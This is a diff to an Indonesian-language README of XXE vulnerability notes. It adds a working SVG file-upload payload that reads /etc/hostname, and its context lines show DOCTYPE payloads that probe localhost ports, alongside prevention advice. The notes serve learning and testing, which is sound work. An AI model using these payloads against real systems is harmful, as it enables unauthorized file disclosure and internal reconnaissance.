@@ -1,4 +1,4 @@
-# VULNERABILITY :bug:
+# VULNERABILITY :beetle:
 
 <p align="center"><img src="https://user-images.githubusercontent.com/52058660/89898222-85c0a500-dc0a-11ea-9eca-815238a55a38.jpg" width="500"></p>
 
@@ -25,6 +25,8 @@ Sebelum memahami XXE, maka kita harus memiliki pengetahuan dasar XML, DTD dan en
     > `<!DOCTYPE xxe SYSTEM "http://127.0.0.1:§port§/">`
     > `<!DOCTYPE xxe SYSTEM "https://127.0.0.1:§port§/">`
   - Exploiting [RSS validator](https://taind.wordpress.com/2017/12/25/root-me-xml-external-entity/). jika tidak punya server sendiri untuk upload file XML, gunakan [filebin](https://filebin.net/)
+  - Exploiting via file upload. Caranya adalah dengan membuat file SVG yang mengandung exploit xxe
+    > `<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>`
     
 - **Prevention**
   - Disable DTD
